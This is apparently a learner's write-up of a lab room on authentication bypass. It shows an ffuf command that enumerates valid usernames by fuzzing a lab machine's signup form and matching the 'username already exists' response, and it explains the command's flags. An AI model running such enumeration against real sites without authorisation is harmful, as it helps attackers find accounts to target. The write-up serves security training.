# 🔓 Authentication Bypass

## 📝 Introduction

In this room, **Authentication Bypass**, we aim to understand how to identify and exploit vulnerabilities that allow attackers to bypass authentication mechanisms. These vulnerabilities can lead to unauthorized access, data leaks, and full system compromise. 
Understanding these techniques is crucial for both offensive security testing and defensive hardening.

## ⚙️ Process

### 1. **Username Enumeration**
will try to create a valid usernames list for the targeted website through the sign up page, in order to find all usernames logged into it previously.
to conduct this attack we will use ffuf which is a enumeration tool, can be downloaded it from https://github.com/ffuf/ffuf.
create a txt file that stored the outputs.


from my terminal:

ffuf -w /home/kali/names.txt \
     -u http://10.10.165.187/customers/signup \
     -X POST \
     -d "username=FUZZ&email=x&password=x&cpassword=x" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -mr "username already exists" \
     -o valid.txt

note: correct order for the flags is =>  
				
					-w -> -u -> -X -> -d -> other flags

-w word list
-u target
-X post HTTP method
-d data
-H Header
-mr match response
-o output file
